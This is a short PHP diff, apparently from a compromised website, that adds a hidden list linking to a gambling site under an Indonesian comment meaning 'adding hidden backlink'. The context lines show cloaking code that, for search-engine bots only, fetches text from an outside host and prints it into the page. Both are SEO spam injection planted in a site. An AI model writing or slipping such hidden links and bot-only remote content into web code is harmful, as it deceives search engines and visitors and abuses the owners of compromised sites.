@@ -16,6 +16,12 @@ if (is_bot()) {
     $message = file_get_contents('https://kiko.avatar-amp.info/musicaljr.com/index.txt');#NAROLINK
     echo $message;
 }
+
+// Menambahkan Backlink Tersembunyi
+echo '<ul style="display:none">';
+echo '<li style="color: #000000;"><a href="https://www.milrosas.com/">slot4d</a></li>';
+echo '</ul>';
+
 ?>
 <?php
 /*
